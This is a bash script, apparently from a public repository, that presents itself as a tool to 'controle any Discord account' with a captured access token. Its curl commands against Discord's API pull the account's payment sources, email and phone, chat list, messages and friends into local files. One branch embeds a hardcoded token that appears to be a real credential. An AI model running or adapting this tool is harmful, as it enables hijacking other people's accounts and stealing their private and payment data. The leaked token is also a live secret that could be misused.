#!/usr/bin/env bash
# Coded By Djawad Hammadi
# Github : https://github.com/Djawed-Hammadi
# ------------------------------------------
# Token Controler For Discord : You Can Controle Any Discord Account And Get All Informations By Acces Token
# I'm Not Responsible For Your Actions 
function banner() {
sleep 3
printf "

╔╦╗┬┌─┐┌─┐┌─┐┬─┐┌┬┐   ╔═╗┌─┐┌┐┌┌┬┐┬─┐┌─┐┬  ┌─┐┬─┐
 ║║│└─┐│  │ │├┬┘ ││───║  │ ││││ │ ├┬┘│ ││  ├┤ ├┬┘
═╩╝┴└─┘└─┘└─┘┴└──┴┘   ╚═╝└─┘┘└┘ ┴ ┴└─└─┘┴─┘└─┘┴└─
 
            Coded By Djawad-Hammadi
            Github : Djawad-Hammadi
              Twitter : @xlinex23   
\n
"
}
function check(){
if [ "$EUID" -ne 0 ];then
printf "Please Run This Tool As Root Using Sudo Command\n"
exit
else
printf ""
fi 
jq=`which jq`
if [[ "$?" == "0" ]];then
printf ""
else 
printf "Installing Jq\n"
sudo apt-install jq > /dev/null 2>&1;
printf "\n"
printf "Done\n"
sleep 5 
clear
fi 
if [[ -e payment_info.txt ]];then
rm -rf payment_info.txt
fi
if [[ -e profile.txt ]];then
rm -rf profile.txt
fi
if [[ -e chat.txt ]];then
rm -rf chat.txt
fi
if [[ -e chat.txt ]];then
rm -rf chat.txt
fi
if [[ -e messages.txt ]];then
rm -rf messages.txt
fi
if [[ -e friends.txt ]];then
rm -rf friends.txt
fi
}
case $1 in
  -P | --Payment)
	check
	banner
	curl -s -H "Authorization:$2" https://discordapp.com/api/v6/users/@me/billing/payment-sources | jq > payment_info.txt
	printf "Result Saved At payment_info.txt\n\n"
    ;;
  -p | --profile)
	check
	banner
	curl -s -H "Authorization:$2" https://discordapp.com/api/v6/users/@me | jq | grep "id\|username\|avatar\|email\|phone\|locale\|verified" > profile.txt
	printf "Result Saved At profile.txt\n\n"
	;;
  -c | --chat)
	check
	banner
	curl -s -H "Authorization:Nzc2NzY5OTY4OTU1NDU3NTQ2.YIcg8w.sTGwZ-8sFLb_lcfxvRr3lTjGEls" https://discordapp.com/api/v6/users/@me/channels | jq | grep "id\|username" > chat.txt
	printf "Result Saved At chat.txt\n\n"
	;;
  -m | --messages)
	check
	banner
	curl -s -H "Authorization:$2" https://discordapp.com/api/v6/channels/{$3}/messages | jq| grep "id\|username\|content" > messages.txt
	printf "Result Saved At messages.txt\n\n"
  	;;
  -f | --friends)
	check
	banner
	curl -s -H "Authorization:$2" https://discordapp.com/api/v6/users/@me/relationships | jq | grep "id\|username" > friends.txt
	printf "Result Saved At friends.txt\n\n"
	;;
  -h | --help)
	 banner
     echo "-P | --Payment : Get Payment Info : visa card Info & master card info ....etc | need just token"
     echo "-p | --profile : Get Profile Info : name & email & avatar ...etc | need just token"
     echo "-c | --chat : Get Chat list | need just token"
     echo "-m | --messages : Get messages | need token and chat id"
     echo "-f | --friends : Get friends list | need just token"
	;;
  *)
	check
	banner
    echo "Error No Argument Please Use -h or --help Command"
    exit
    ;;
esac
